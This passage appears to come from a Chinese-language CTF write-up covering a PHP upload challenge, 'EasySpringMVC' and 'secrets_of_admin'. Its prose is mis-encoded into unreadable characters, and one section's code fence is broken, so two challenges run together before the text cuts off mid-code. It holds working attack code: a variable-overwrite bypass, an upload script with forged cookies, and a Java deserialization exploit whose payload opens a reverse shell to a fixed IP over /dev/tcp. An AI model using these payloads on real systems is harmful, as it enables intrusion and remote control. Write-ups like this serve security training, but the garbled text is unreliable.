&lt;/div&gt;</span><br><span class="hljs-string">    &lt;/form&gt;</span><br><span class="hljs-string">&lt;/body&gt;</span><br><span class="hljs-string">&lt;/html&gt;</span><br><span class="hljs-string">EOD</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$html</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br>&lt;script&gt;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">displayInput</span>(<span class="hljs-params"></span>) </span>&#123;<br>      <span class="hljs-keyword">var</span> inputText = document.<span class="hljs-title function_ invoke__">getElementById</span>(<span class="hljs-string">&quot;input-text&quot;</span>).value;<br>      document.<span class="hljs-title function_ invoke__">write</span>(inputText)<br>    &#125;<br>&lt;/script&gt;<br></code></pre></td></tr></table></figure><p>é¦–å…ˆå­˜åœ¨<code>extract()</code>å˜é‡è¦†ç›–ï¼Œç„¶åè¦æ±‚<code>$isLocal</code>ä¸ºçœŸæ‰èƒ½è¿›ä¸Šä¼ ç•Œé¢ã€‚ä¸¤ç§è§£æ³•:</p><ul><li><p>åˆ©ç”¨å˜é‡è¦†ç›–å…ˆè®©<code>$isLocal=true</code>å³<code>?_SERVER[REMOTE_ADDR]=127.0.0.1</code>è¿›ä¸Šä¼ æ–‡ä»¶ç•Œé¢ï¼Œç„¶å<code>upload</code>æ–‡ä»¶å¤¹</p></li><li><p>ç¬¬äºŒç§æ–¹æ³•å°±ç›´æ¥å†™ä¸ªè„šæœ¬ç”¨è¡¨å•ä¸Šä¼ ï¼š</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://challenge.qsnctf.com:30074/upload.php&quot;</span><br><br>headers = &#123;<br>    <span class="hljs-string">&quot;Cookie&quot;</span>: <span class="hljs-string">&quot;TOKEN=65794a3163325679626d46745a534936496a45694c434169644739725a5734694f694a6a4e474e684e44497a4f474577596a6b794d7a67794d47526a597a55774f5745325a6a63314f4451355969497349434a70633139685a473170626949364d48303d; token=eyJ1c2VybmFtZSI6Ii4uIiwicGFzc3dvcmQiOiIxIiwiZmlsZW5hbWUiOiJ0eHkucG5nIn0%3d&quot;</span><br>&#125;<br><br>data = &#123;<br>    <span class="hljs-string">&quot;upload&quot;</span>:<span class="hljs-number">1</span><br>&#125;<br>file = &#123;<br>    <span class="hljs-string">&quot;file&quot;</span>:<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;txy.png&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>)<br>&#125;<br>r = requests.post(url,data=data,files=file,headers=headers)<br><span class="hljs-built_in">print</span>(r.text)<br></code></pre></td></tr></table></figure><h2 id="EasySpringMVC"><a href="#EasySpringMVC" class="headerlink" title="EasySpringMVC"></a>EasySpringMVC</h2><p>é¦–å…ˆ<code>Tools</code>ç±»ä¸‹å­˜åœ¨å¾ˆæ˜æ˜¾çš„ååºåˆ—åŒ–+å‘½ä»¤æ‰§è¡Œï¼š</p><p><img src="/img/spring_mvc_1.png" alt="spring_mvc_1"></p><p>æ‰¾å“ªé‡Œè°ƒç”¨äº†è¿™ä¸ª<code>parse</code>ï¼Œçœ‹<code>ClentInfoFilter.class</code>ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ClentInfoFilter</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Filter</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">ClentInfoFilter</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(FilterConfig fcg)</span> &#123;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilter</span><span class="hljs-params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>        Cookie[] cookies = ((HttpServletRequest)request).getCookies();<br>        <span class="hljs-type">boolean</span> <span class="hljs-variable">exist</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>;<br>        <span class="hljs-type">Cookie</span> <span class="hljs-variable">cookie</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">if</span> (cookies != <span class="hljs-literal">null</span>) &#123;<br>            Cookie[] var7 = cookies;<br>            <span class="hljs-type">int</span> <span class="hljs-variable">var8</span> <span class="hljs-operator">=</span> cookies.length;<br><br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">var9</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; var9 &lt; var8; ++var9) &#123;<br>                <span class="hljs-type">Cookie</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> var7[var9];<br>                <span class="hljs-keyword">if</span> (c.getName().equals(<span class="hljs-string">&quot;cinfo&quot;</span>)) &#123;<br>                    exist = <span class="hljs-literal">true</span>;<br>                    cookie = c;<br>                    <span class="hljs-keyword">break</span>;<br>                &#125;<br>            &#125;<br>        &#125;<br><br>        <span class="hljs-type">byte</span>[] bytes;<br>        <span class="hljs-keyword">if</span> (exist) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">b64</span> <span class="hljs-operator">=</span> cookie.getValue();<br>            Base64.<span class="hljs-type">Decoder</span> <span class="hljs-variable">decoder</span> <span class="hljs-operator">=</span> Base64.getDecoder();<br>            bytes = decoder.decode(b64);<br>            <span class="hljs-type">ClientInfo</span> <span class="hljs-variable">cinfo</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>            <span class="hljs-keyword">if</span> (!b64.equals(<span class="hljs-string">&quot;&quot;</span>) &amp;&amp; bytes != <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    cinfo = (ClientInfo)Tools.parse(bytes);<br>                &#125; <span class="hljs-keyword">catch</span> (Exception var14) &#123;<br>                    var14.printStackTrace();<br>                &#125;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                cinfo = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClientInfo</span>(<span class="hljs-string">&quot;Anonymous&quot;</span>, <span class="hljs-string">&quot;normal&quot;</span>, ((HttpServletRequest)request).getRequestedSessionId());<br>                Base64.<span class="hljs-type">Encoder</span> <span class="hljs-variable">encoder</span> <span class="hljs-operator">=</span> Base64.getEncoder();<br><br>                <span class="hljs-keyword">try</span> &#123;<br>                    bytes = Tools.create(cinfo);<br>                &#125; <span class="hljs-keyword">catch</span> (Exception var15) &#123;<br>                    var15.printStackTrace();<br>                &#125;<br><br>                cookie.setValue(encoder.encodeToString(bytes));<br>            &#125;<br><br>            ((HttpServletRequest)request).getSession().setAttribute(<span class="hljs-string">&quot;cinfo&quot;</span>, cinfo);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            Base64.<span class="hljs-type">Encoder</span> <span class="hljs-variable">encoder</span> <span class="hljs-operator">=</span> Base64.getEncoder();<br><br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-type">ClientInfo</span> <span class="hljs-variable">cinfo</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ClientInfo</span>(<span class="hljs-string">&quot;Anonymous&quot;</span>, <span class="hljs-string">&quot;normal&quot;</span>, ((HttpServletRequest)request).getRequestedSessionId());<br>                bytes = Tools.create(cinfo);<br>                cookie = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Cookie</span>(<span class="hljs-string">&quot;cinfo&quot;</span>, encoder.encodeToString(bytes));<br>                cookie.setMaxAge(<span class="hljs-number">86400</span>);<br>                ((HttpServletResponse)response).addCookie(cookie);<br>                ((HttpServletRequest)request).getSession().setAttribute(<span class="hljs-string">&quot;cinfo&quot;</span>, cinfo);<br>            &#125; <span class="hljs-keyword">catch</span> (Exception var13) &#123;<br>                var13.printStackTrace();<br>            &#125;<br>        &#125;<br><br>        chain.doFilter(request, response);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/img/spring_mvc_2.png" alt="spring_mvc_2"></p><p>æ‰€ä»¥è¿™é‡Œæ„é€ ä¸€ä¸ªæ¶æ„çš„<code>cookie</code>ä¼ è¿›å»å°±è¡Œï¼Œé€šè¿‡é‡å†™<code>writeObject</code>æ–¹æ³•è¿›è¡Œå‘½ä»¤æ‰§è¡Œï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.tools;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Tools</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br>  <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">serialVersionUID</span> <span class="hljs-operator">=</span> <span class="hljs-number">1L</span>;<br>  <br>  <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">parse</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] bytes)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(bytes));<br>    <span class="hljs-keyword">return</span> ois.readObject();<br>  &#125;<br>  <span class="hljs-keyword">private</span> String testCall;<br>  <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] create(Object obj) <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">bos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>    <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">outputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(bos);<br>    outputStream.writeObject(obj);<br>    <span class="hljs-keyword">return</span> bos.toByteArray();<br>  &#125;<br>  <br>  <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(ObjectInputStream in)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>    <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> in.readObject();<br>    (<span class="hljs-keyword">new</span> <span class="hljs-title class_">ProcessBuilder</span>((String[])obj)).start();<br>  &#125;<br>  <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">writeObject</span><span class="hljs-params">(ObjectOutputStream out)</span> <span class="hljs-keyword">throws</span> IOException,ClassNotFoundException&#123;<br>    String command[]=&#123;<span class="hljs-string">&quot;bash&quot;</span>,<span class="hljs-string">&quot;-c&quot;</span>,<span class="hljs-string">&quot;bash -i&gt;&amp; /dev/tcp/174.1.200.126/2333 0&gt;&amp;1&quot;</span>&#125;;<br>    out.writeObject(command);<br>  &#125;<br></code></pre></td></tr></table></figure><p><code>Main.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.tools;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> com.tools.*;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        Base64.<span class="hljs-type">Encoder</span> <span class="hljs-variable">encoder</span> <span class="hljs-operator">=</span> Base64.getEncoder();<br><span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Tools</span> <span class="hljs-variable">cinfo</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Tools</span>();<br>            <span class="hljs-type">byte</span>[] bytes = Tools.create(cinfo);<br>            <span class="hljs-type">String</span> <span class="hljs-variable">payload</span> <span class="hljs-operator">=</span> encoder.encodeToString(bytes);<br>            System.out.println(payload);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="realrce"><a href="#realrce" class="headerlink" title="realrce"></a>realrce</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-string">``</span><span class="hljs-string">`</span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string"></span><br><span class="hljs-string">## secrets_of_admin</span><br><span class="hljs-string"></span><br><span class="hljs-string">`</span><span class="hljs-string">``</span>js<br><span class="hljs-comment">//index.ts</span><br><br><span class="hljs-keyword">const</span> readFile = <span class="hljs-title function_">promisify</span>(fs.<span class="hljs-property">readFile</span>)<br><br><span class="hljs-keyword">const</span> getCheckSum = (<span class="hljs-attr">filename</span>: string): <span class="hljs-title class_">Promise</span>&lt;string&gt; =&gt; &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Promise</span>(<span class="hljs-function">(<span class="hljs-params">resolve, reject</span>) =&gt;</span> &#123;<br>        <span class="hljs-keyword">const</span> shasum = crypto.<span class="hljs-title function_">createHash</span>(<span class="hljs-string">&#x27;md5&#x27;</span>);<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">const</span> s = fs.<span class="hljs-title function_">createReadStream</span>(path.<span class="hljs-title function_">join</span>(__dirname , <span class="hljs-string">&quot;../files/&quot;</span>, filename));<br>            s.<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;data&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">data</span>) =&gt;</span> &#123;<br>                shasum.<span class="hljs-title function_">update</span>(data)<br>            &#125;)<br>            s.<span class="hljs-title function_">on</span>(<span class="hljs-string">&#x27;end&#x27;</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-title function_">resolve</span>(shasum.<span class="hljs-title function_">digest</span>(<span class="hljs-string">&#x27;hex&#x27;</span>));<br>            &#125;)<br>        &#125; <span class="hljs-keyword">catch</span> (err) &#123;<br>            <span class="hljs-title function_">reject</span>(err)<br>        &#125;<br>    &#125;)<br>&#125;<br><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">checkAuth</span> = (<span class="hljs-params">req: Request, res:Response, next:NextFunction</span>) =&gt; &#123;<br>    <span class="hljs-keyword">let</span> token = req.<span class="hljs-property">signedCookies</span>[<span class="hljs-string">&#x27;token&#x27;</span>]<br>    <span class="hljs-keyword">if</span> (token &amp;&amp; token[<span class="hljs-string">&quot;username&quot;</span>]) &#123;<br>        <span class="hljs-keyword">if</span> (token.<span class="hljs-property">username</span> === <span class="hljs-string">&#x27;superuser&#x27;</span>)&#123;<br>            <span class="hljs-title function_">next</span>(<span class="hljs-title function_">createError</span>(<span class="hljs-number">404</span>)) <span class="hljs-comment">// superuser is disabled since you can&#x27;t even find it in database :)</span><br>        &#125;<br>        <span class="hljs-keyword">if</span> (token.<span class="hljs-property">isAdmin</span> === <span class="hljs-literal">true</span>) &#123;<br>            <span class="hljs-title function_">next</span>();<br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">redirect</span>(<span class="hljs-string">&#x27;/&#x27;</span>)<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-title function_">next</span>(<span class="hljs-title function_">createError</span>(<span class="hljs-number">404</span>));<br>    &#125;<br>&#125;<br><br><br><span class="hljs-keyword">const</span> router = express.<span class="hljs-title class_">Router</span>();<br><br>router.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-function">(<span class="hljs-params">_, res</span>) =&gt;</span> res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;index&#x27;</span>, &#123; <span class="hljs-attr">message</span>: <span class="hljs-string">`Only admin&#x27;s function is implemented. ğŸ˜– `</span>&#125;))<br><br>router.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-keyword">async</span> (req, res) =&gt; &#123;<br>    <span class="hljs-keyword">let</span> &#123; username, password &#125; = req.<span class="hljs-property">body</span>;<br>    <span class="hljs-keyword">if</span> ( username &amp;&amp; password) &#123;<br>        <span class="hljs-keyword">if</span> ( username == <span class="hljs-string">&#x27;&#x27;</span> || <span class="hljs-title function_">typeof</span>(username) !== <span class="hljs-string">&quot;string&quot;</span> || password == <span class="hljs-string">&#x27;&#x27;</span> || <span class="hljs-title function_">typeof</span>(password) !== <span class="hljs-string">&quot;string&quot;</span> ) &#123;<br>            <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;index&#x27;</span>, &#123; <span class="hljs-attr">error</span>: <span class="hljs-string">&#x27;Parameters error ğŸ‘»&#x27;</span>&#125;);<br>        &#125;<br>        <span class="hljs-keyword">let</span> data = <span class="hljs-keyword">await</span> <span class="hljs-variable constant_">DB</span>.<span class="hljs-title class_">Login</span>(username, password)<br>        <span class="hljs-keyword">if</span>(!data) &#123;<br>            <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;index&#x27;</span>, &#123; error : <span class="hljs-string">&#x27;You are not admin ğŸ˜¤&#x27;</span>&#125;);<br>        &#125;<br>        res.<span class="hljs-title function_">cookie</span>(<span class="hljs-string">&#x27;token&#x27;</span>, &#123;<br>            <span class="hljs-attr">username</span>: username,<br>            <span class="hljs-attr">isAdmin</span>: <span class="hljs-literal">true</span> <br>        &#125;, &#123; <span class="hljs-attr">signed</span>: <span class="hljs-literal">true</span> &#125;)<br>        res.<span class="hljs-title function_">redirect</span>(<span class="hljs-string">&#x27;/admin&#x27;</span>);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;index&#x27;</span>, &#123; error : <span class="hljs-string">&#x27;Parameters cannot be blank ğŸ˜’&#x27;</span>&#125;);<br>    &#125;<br>&#125;)<br><br>router.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/admin&#x27;</span>, checkAuth, <span class="hljs-keyword">async</span> (req, res) =&gt; &#123;<br>    <span class="hljs-keyword">let</span> token = req.<span class="hljs-property">signedCookies</span>[<span class="hljs-string">&#x27;token&#x27;</span>];<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">const</span> files = <span class="hljs-keyword">await</span> <span class="hljs-variable constant_">DB</span>.<span class="hljs-title function_">listFile</span>(token.<span class="hljs-property">username</span>);<br>        <span class="hljs-keyword">if</span> (files) &#123;<br>            res.<span class="hljs-title function_">cookie</span>(<span class="hljs-string">&#x27;token&#x27;</span>, &#123;<span class="hljs-attr">username</span>: token.<span class="hljs-property">username</span>, <span class="hljs-attr">files</span>: files, <span class="hljs-attr">isAdmin</span>: <span class="hljs-literal">true</span> &#125;, &#123; <span class="hljs-attr">signed</span>: <span class="hljs-literal">true</span> &#125;)<br>        &#125;<br>    &#125; <span class="hljs-keyword">catch</span> (err) &#123;<br>        <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;admin&#x27;</span>, &#123; <span class="hljs-attr">error</span>: <span class="hljs-string">&#x27;Something wrong ... ğŸ‘»&#x27;</span>&#125;)<br>    &#125;<br>    <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;admin&#x27;</span>);<br>&#125;);<br><br>router.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/admin&#x27;</span>, checkAuth, <span class="hljs-function">(<span class="hljs-params">req, res, next</span>) =&gt;</span> &#123;<br>    <span class="hljs-keyword">let</span> &#123; content &#125; = req.<span class="hljs-property">body</span>;<br>    <span class="hljs-keyword">if</span> ( content == <span class="hljs-string">&#x27;&#x27;</span> || content.<span class="hljs-title function_">includes</span>(<span class="hljs-string">&#x27;&lt;&#x27;</span>) || content.<span class="hljs-title function_">includes</span>(<span class="hljs-string">&#x27;&gt;&#x27;</span>) || content.<span class="hljs-title function_">includes</span>(<span class="hljs-string">&#x27;/&#x27;</span>) || content.<span class="hljs-title function_">includes</span>(<span class="hljs-string">&#x27;script&#x27;</span>) || content.<span class="hljs-title function_">includes</span>(<span class="hljs-string">&#x27;on&#x27;</span>))&#123;<br>        <span class="hljs-comment">// even admin can&#x27;t be trusted right ? :)  </span><br>        <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;admin&#x27;</span>, &#123; <span class="hljs-attr">error</span>: <span class="hljs-string">&#x27;Forbidden word ğŸ¤¬&#x27;</span>&#125;);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">let</span> template = <span class="hljs-string">`</span><br><span class="hljs-string">        &lt;html&gt;</span><br><span class="hljs-string">        &lt;meta charset=&quot;utf8&quot;&gt;</span><br><span class="hljs-string">        &lt;title&gt;Create your own pdfs&lt;/title&gt;</span><br><span class="hljs-string">        &lt;body&gt;</span><br><span class="hljs-string">        &lt;h3&gt;<span class="hljs-subst">$&#123;content&#125;</span>&lt;/h3&gt;</span><br><span class="hljs-string">        &lt;/body&gt;</span><br><span class="hljs-string">        &lt;/html&gt;</span><br><span class="hljs-string">        `</span><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">const</span> filename = <span class="hljs-string">`<span class="hljs-subst">$&#123;uuid()&#125;</span>.pdf`</span><br>            pdf.<span class="hljs-title function_">create</span>(template, &#123;<br>                <span class="hljs-string">&quot;format&quot;</span>: <span class="hljs-string">&quot;Letter&quot;</span>,<br>                <span class="hljs-string">&quot;orientation&quot;</span>: <span class="hljs-string">&quot;portrait&quot;</span>,<br>                <span class="hljs-string">&quot;border&quot;</span>: <span class="hljs-string">&quot;0&quot;</span>,<br>                <span class="hljs-string">&quot;type&quot;</span>: <span class="hljs-string">&quot;pdf&quot;</span>,<br>   